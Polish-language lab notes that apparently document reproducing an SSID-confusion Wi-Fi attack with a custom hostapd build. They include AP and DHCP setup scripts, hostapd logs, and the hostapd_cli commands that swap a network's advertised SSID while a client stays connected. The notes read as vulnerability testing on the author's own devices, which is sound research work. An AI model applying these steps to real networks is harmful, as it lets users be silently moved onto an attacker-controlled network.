## **Co się udało:**

* Build custom wersji hostapd (bardzo niejasna instrukcja, większości trzeba sie domyślic)
* Ustawienie karty sieciowej zeby z nami wspolpracowala (network manager, monitor mode)
* Bash scripty do konfiguracji AP na naszej karcie sieciowej, prostego servera DHCP (cel - mobile client nie chce się połączyć do sieci jak nie dostaje zadnego IP)
* Postawienie AP - siec jest widoczna dla clienta ale no security -> no i tu jest glowny problem, w tym custom confie hostapd nie dziala wpa

## **No więc co sie dzieje:**

* Jak mamy postawiony server dhcp to client jest w stanie polaczyc sie do sieci ALE:

```bash
sudo ./hostapd hostapd_test.conf

wlo1: interface state UNINITIALIZED->ENABLED
wlo1: AP-ENABLED
>>> Simulating attack: Overwriting SSID in outgoing Beacon frames
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
wlo1: STA 6e:69:91:91:90:fd IEEE 802.11: authenticated
>>> Simulating attack: Overwriting SSID of incoming Association Request
wlo1: STA 6e:69:91:91:90:fd IEEE 802.11: associated (aid 1)
wlo1: AP-STA-CONNECTED 6e:69:91:91:90:fd
wlo1: STA 6e:69:91:91:90:fd RADIUS: starting accounting session 18A9B916F883346D
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
```

Z jakiegos powodu nasz AP robi jakiego autha prze Radiusa XD. Próbowałem to wyłączyć przez zacomentowanie wszystkich ustawien z radiusem w hostapd/.config (jest nawet linijka do wyłączenia calego radiusa) - no ale efekt calt czas taki sam.

## **Jak to wyglada z perspektywy usera:**

* Stawiamy Siec connectssid - client ja widzi i moze sie polaczyc

Jak zrobimy ta komende co symuluje atak:
`./hostapd_cli -p wpaspy_ctrl raw "FAKESSID changedssid"`

* * Client zaczyna widzec po prostu inna siec "changedssid", jak chce to do niej rowniez sie moze polaczyc

### **Testowalem jeszcze ten optimized attack, tam sie robi tak ze stawiasz siec, laczysz sie do niej i dopiero jak juz masz clienta zasocjowanego to podmieniasz to ssid:**

```
./hostapd_cli -p wpaspy_ctrl raw "CHANGESSID changedssid"
```

Co sie wtedy dzieje - Połączony client sie po prostu rozlacza i po chwili widzi nowa siec "changedssid"

## **Moje skrypty w bashu zeby nie pisac milion razy tego samego**

### **`setup_ap.sh`:**

```bash
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

INTERFACE="wlo1"
IP_ADDRESS="192.168.100.1/24"

echo "Disabling Wi-Fi management by NetworkManager"
nmcli radio wifi off

echo "Unblocking Wi-Fi using rfkill"
rfkill unblock wifi

echo "Taking down interface $INTERFACE"
ip link set "$INTERFACE" down

echo "Setting interface $INTERFACE to AP mode"
iw "$INTERFACE" set type __ap

echo "Bringing up interface $INTERFACE"
ip link set "$INTERFACE" up

echo "Assigning IP address $IP_ADDRESS to $INTERFACE"
ip addr add "$IP_ADDRESS" dev "$INTERFACE"

echo "Wireless configuration:"
iwconfig
```

### **`setup_dhcp.sh`**

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

INTERFACE="wlo1"
DNSMASQ_CONF="dnsmasq.conf"

echo "Setting up dnsmasq configuration"
cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.100.10,192.168.100.200,8h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
# log-queries
# log-dhcp
EOF

echo "dnsmasq configuration written to $DNSMASQ_CONF"

echo "Starting dnsmasq with configuration: $DNSMASQ_CONF"
dnsmasq -d -C "$DNSMASQ_CONF"
```

### **`revoke_services.sh`**

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

ACTION="$1"

if [[ "$ACTION" == "disable" ]]; then
  echo "Stopping, disabling, and masking systemd-resolved"
  systemctl stop systemd-resolved
  systemctl disable systemd-resolved
  systemctl mask systemd-resolved
  echo "systemd-resolved has been disabled and masked"
elif [[ "$ACTION" == "enable" ]]; then
  echo "Unmasking, enabling, and starting systemd-resolved"
  systemctl unmask systemd-resolved
  systemctl enable systemd-resolved
  systemctl start systemd-resolved
  echo "systemd-resolved has been restored"
else
  echo "Usage: $0 [disable|enable]"
  exit 1
fi
```

## **Kroki co sie robi po kolei żeby pamietac na przyszlosc:**

1. Build custom hostapd na podstawie .config (makefile)
2. Setup systemu i interfejsu pod ap (script albo z palca)
3. Zwolnienie portu żeby server dhcp dzialal
4. Setup servera dhcp
5. No a dalej próbujesz postępować z tym jakże skromnym readme na repo XD

---

## Kroki podjęte w celu sprawdzenia czy urządzenia są podatne oraz czy skrypt działa poprawnie:

* **Stworzenie serwera DHCP który po połączeniu do sieci przypiszę urządzeniu adres z puli:**



```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./setup_dhcp.sh
Setting up dnsmasq configuration
dnsmasq configuration written to dnsmasq.conf
Starting dnsmasq with configuration: dnsmasq.conf
dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.100.10 -- 192.168.100.200, lease time 8h
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 8 names
dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPREQUEST(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPACK(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
```

* **Stworzenie “TrustedNet” do której podłączany jest użytkownik :**

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./hostapd hostapd_test.conf
wlp0s20f3: interface state UNINITIALIZED->ENABLED
wlp0s20f3: AP-ENABLED
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: authenticated
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: associated (aid 1)
wlp0s20f3: AP-STA-CONNECTED ce:30:57:8e:78:77
wlp0s20f3: STA ce:30:57:8e:78:77 RADIUS: starting accounting session BAC8A9A46C9E7BFB
wlp0s20f3: AP-STA-DISCONNECTED ce:30:57:8e:78:77
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: disassociated
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
wlp0s20f3: INTERFACE-DISABLED
wlp0s20f3: INTERFACE-ENABLED
Failed to set beacon parameters
^Cwlp0s20f3: interface state ENABLED->DISABLED
wlp0s20f3: AP-DISABLED
wlp0s20f3: CTRL-EVENT-TERMINATING
nl80211: deinit ifname=wlp0s20f3 disabled_11b_rates=0
```

* **Podmiana SSID w trakcie kiedy użytkownik jest podłączony do “TrustedNet” na “WrongNet”**

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./hostapd_cli -p wpaspy_ctrl raw "CHANGESSID changedssid"
Selected interface 'wlp0s20f3'
OK
```

* **Po zmianie SSID w pakietach było ono podmieniane przez co dalej mieliśmy połączenie z użytkownikiem mimo który myślał, że dalej jest podłączony do “TrustedNet”**

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ ping 192.168.100.85
PING 192.168.100.85 (192.168.100.85) 56(84) bytes of data.
64 bytes from 192.168.100.85: icmp_seq=1 ttl=64 time=18.7 ms
64 bytes from 192.168.100.85: icmp_seq=2 ttl=64 time=2.81 ms
64 bytes from 192.168.100.85: icmp_seq=3 ttl=64 time=85.2 ms
64 bytes from 192.168.100.85: icmp_seq=4 ttl=64 time=86.2 ms
64 bytes from 192.168.100.85: icmp_seq=5 ttl=64 time=109 ms
64 bytes from 192.168.100.85: icmp_seq=6 ttl=64 time=28.9 ms
64 bytes from 192.168.100.85: icmp_seq=7 ttl=64 time=52.6 ms
…
--- 192.168.100.85 ping statistics ---
26 packets transmitted, 26 received, 0% packet loss, time 25038ms
rtt min/avg/max/mdev = 2.365/57.484/109.894/35.192 ms
```

tutaj tak samo z tymi blokami, wloz tez ta reszte blokow ktora nie jest
